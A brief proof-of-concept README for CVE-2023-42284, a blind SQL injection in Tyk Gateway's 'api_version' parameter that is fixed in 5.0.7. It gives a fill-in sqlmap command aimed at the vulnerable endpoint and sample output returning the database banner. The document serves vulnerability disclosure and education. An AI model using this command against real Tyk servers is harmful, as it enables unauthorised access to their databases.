# Disclaimer
For educational purpose only!

## Details
Proof of concept for CVE-2023-42284.
Tyk Gateway is vulnerable to SQL injection.
Fixed in 5.0.7 version.

The URL parameter ‘api_version’ of the "https://<YOUR_URL>/api/errors/count/...?res=day&p=...&api_version=<PAYLOAD_HERE>&api_id=..."is vulnerable to Blind SQL injection.

## Exploitation

Use sqlmap with following parameters:

```
python.exe .\sqlmap.py -u "https://<INSERT YOUR URL>/api/errors/count/11/8/2022/13/1/2022?res=day&p=-1&api_version=Non%20Versioned&api_id=<INSERT YOUR API_ID>" -p "api_version" --cookie="<INSERT COOKIE HERE> --banner
```

SQL DB banner is returned in response:

```
...
banner: Postgresql 13.01 on x86_64-pc-linux-gnu
...
```
